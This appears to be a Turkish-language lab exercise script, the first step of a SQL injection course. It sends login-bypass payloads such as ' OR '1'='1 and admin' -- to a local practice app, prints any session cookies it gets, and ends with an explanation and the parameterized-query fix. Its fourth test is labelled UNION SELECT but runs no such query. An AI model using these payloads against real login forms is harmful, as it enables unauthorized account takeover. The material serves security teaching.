"""
ADIM 1: SQL INJECTION ile Login Atlatma
========================================
Zafiyet: Kullanici adi ve sifre direkt SQL sorgusunda birlestiriliyor.
Hedef:  Admin hesabina sifresiz giris yapmak.

Calistirma:  python 01-sql-login-bypass.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 1] SQL Injection - Login Bypass
--------------------------------------""")

# --- YONTEM 1: Basit bypass ---
print("\n[TEST 1] ' OR '1'='1 ile kullanici adindan atlatma")
data = {"username": "' OR '1'='1", "password": "x"}
r = requests.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Basarili! Session cookie alindi:", r.cookies.get_dict())
else:
    print("[HATA] Basarisiz. HTTP", r.status_code)

# --- YONTEM 2: Admin'e ozel bypass ---
print("\n[TEST 2] Admin hesabina ozel SQLi: ' OR role='admin")
data = {"username": "' OR role='admin", "password": "x"}
r = requests.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Admin giris basarili! Cookie:", r.cookies.get_dict())
else:
    print("[HATA] Basarisiz. HTTP", r.status_code)

# --- YONTEM 3: Yorum satiri ile ---
print("\n[TEST 3] SQL yorum satiri ile: ' --")
data = {"username": "admin' --", "password": "x"}
r = requests.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Admin giris basarili! (yorum satiri)")
else:
    print("[HATA] Basarisiz. HTTP", r.status_code)

# --- YONTEM 4: UNION ile admin sifresini gorme ---
print("\n[TEST 4] UNION SELECT ile sifreleri gorme")
s = requests.Session()
# Once giris yap
data = {"username": "' OR '1'='1", "password": "x"}
s.post(f"{HEDEF}/", data=data)

# Admin paneline git
r = s.get(f"{HEDEF}/admin")
if "admin123" in r.text:
    print("[OK] Admin sifresi bulundu: admin123")
else:
    print("[HATA] Admin sifresi gorulemedi")

print("\n" + "="*50)
print("OGRENILENLER:")
print("1. Kullanici adi alanina ' OR '1'='1 yazmak sorguyu atlatir")
print("2. Bunun sebebi: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'x'")
print("3. '1'='1 her zaman TRUE oldugu icin tum kullanicilar doner")
print("4. Cozum: Parameterized query (?) kullanmali")
print("="*50)
